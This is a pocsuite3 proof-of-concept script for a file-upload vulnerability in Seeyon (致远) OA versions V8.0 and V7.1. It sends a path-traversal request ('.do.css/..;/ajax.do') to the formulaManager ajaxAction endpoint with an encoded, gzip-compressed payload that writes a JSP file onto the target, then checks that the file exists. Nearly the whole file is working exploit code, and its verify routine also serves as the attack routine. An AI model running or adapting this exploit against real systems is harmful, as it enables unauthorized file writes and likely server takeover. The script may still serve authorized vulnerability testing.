#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''致远_ajaxAction_file_upload'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = ''''''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''致远OA'''
    appVersion = '''V8.0,V7.1'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"
        }
        exp = '''managerMethod=validate&arguments=%1F%C2%8B%08%00rX%C2%8A%60%00%C3%BFmR%C3%AF%C2%8F%C2%9A@%10%C3%BDW%08_%C3%90%C3%B4%C2%8A%C2%88%C2%A7%C3%A9%C3%95%C3%B8%C2%A1%C2%B6@%C2%ABwT%11%C2%96%1FM%C3%93,%C3%8B%C2%8A%C3%A8%C3%82nX%C2%A8%10s%C3%BF%C3%BB-b%7BMs%C2%9Ff%C3%A6%C3%AD%C2%9B%C3%B7&3%C3%BB%C3%A3%C2%A2%C3%ACi%C2%99%C3%97%04%C2%BA-%C3%83%C3%8AGi%7C'%C3%BDAl%C2%98w%C2%88Ra%5E)%C2%AF%C2%B0%C3%91%C2%B0%12s%C2%9E%C3%91%C2%A2%7B%C3%9CUeV%C2%A4%12%C2%83%C3%95AZH%C2%B2%C2%AA%C2%8E%C3%8E8%C2%86%C2%8C%C3%B1%11%C3%87%C2%B8%C2%A5%C3%85H%C2%9E%1F%C3%A1o%C2%A8fT%C3%9D%08f%C3%A5%C2%97Y%C2%85K%C2%89%C2%BD%C3%A6%C2%BA%C3%A8+%C3%B0Yz%C2%836%C3%A8d%C3%9F%C3%89%C2%BD%C3%92%C2%AFn%0E%C3%B5%C3%88%C2%99%3C%C2%9C%C3%9F%5C%C3%B9%01%13%C3%92%C3%99n%3E%7B%C3%ABx%02%C2%B4%C3%87b%C3%99B%7F%C2%AA%C3%85%C3%96=%C2%8Ds0%C3%B9f%C3%9A%1A%C3%8AI%1D%C2%B5%C2%87:%0AP%C2%8A&%C2%A0~%C3%8C%C3%87%0C%C3%A9O%C3%B5%C3%B6d%C2%BA%C2%8E%1Bj%C2%8E%05%C2%8E%C2%B1%C3%AE%10%C2%94%C2%A5%C3%AC1wH%C2%A8?%C2%9C%22o5%C2%8E%C3%B2%C2%A8%C3%832%C2%9F8%C3%A6%C3%93i%C3%AAy%01%C2%B1%C2%81%01%C3%AE%5D/YCcl%C2%B8A%C2%B2%01VC%5D%C2%90%C3%98%C2%896%C2%9E%C3%81%09%C2%B3qn%C3%8F%C3%BC%C2%80%C3%B9%C3%90%C2%9B%1A%C2%AE%C2%ABe%C3%AB%C3%9D%C2%89%7D?%C2%B3%C2%AB7%C3%8CM=%C3%9CMY%C3%9CN-%C3%A87dm%C2%99gd5,%C3%94M%0D%C3%BA%0Fb%C2%AE%C2%84$%C3%A6%C2%8A%C2%84~%C2%B3%0D%03%C2%87%C2%AE%C2%BF%C2%AE%08%0A%00A%C2%93m%1D%C3%A9@%C3%B3t%C3%90&y#8%C3%8BCb%C2%A5%C2%B4%C3%93%C3%AE%C3%A6%C2%8D-%C2%A0E%C2%BBT%C3%B8P%C2%B2I%17%0By%C3%8E%C3%ABB%C3%8D3%C2%8E%C3%94%C3%A5%C2%A7%C2%9D1%C2%BB%C3%BF%C2%82%11M%C3%84%C3%8E%C2%93%5B%C3%AC%C3%97%C3%BD6i%C3%B0w%C2%B7=%C3%BBV%C3%B4-%7D1%C2%B8%C3%A9%C2%A8%7D%5C%C3%96%C3%BB%C2%BD%C3%A8%C2%BB%C2%9Ebx'%7B%C2%AE%C3%B9%C3%BE%C2%83%C2%B8%C3%90%C2%BF%07V%C2%AF%05)n%C2%9D%C2%BD%C3%8C%7F%14D(%C3%87%C3%82%C3%BDy%C3%9E%C2%9DY$%09%C3%9EK%C2%BC%C2%82U%C2%86%C2%A4%C2%A6i%06%C3%83%C2%8B%C3%B2,%C3%BE%C2%A0%C3%B8%C2%87%C2%97.Ve%C2%8D%C2%95%C2%9F/%01;%1F%C3%A2%C2%BE%02%00%00'''
        test_url = make_verify_url(self.url, '/seeyon/thirdpartyController.do.css/..;/ajax.do', mod=0)
        vul_url = make_verify_url(self.url, '/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip', mod=0)
        verify_url = make_verify_url(self.url, '/seeyon/seeyon_test.jsp', mod=0)
        resp = requests.get(test_url, timeout=15, allow_redirects=False, verify=False)
        if b"java.lang.NullPointerException:null" in resp.content:
            resp2 = requests.post(vul_url,headers=headers,timeout=15, data=exp)
            if b'"message":null' in resp2.content:
                resp3 = requests.get(verify_url, timeout=15, allow_redirects=False, verify=False)
                if resp3.status_code == 200 and b"e165421110ba03099a1c0393373c5b43" in resp3.content:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_url
                    result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if not result:
            result = 'Failed'

        if isinstance(result, dict):
            output.success(result)
        else:
            output.fail(result)
        return output


register_poc(TestPOC)
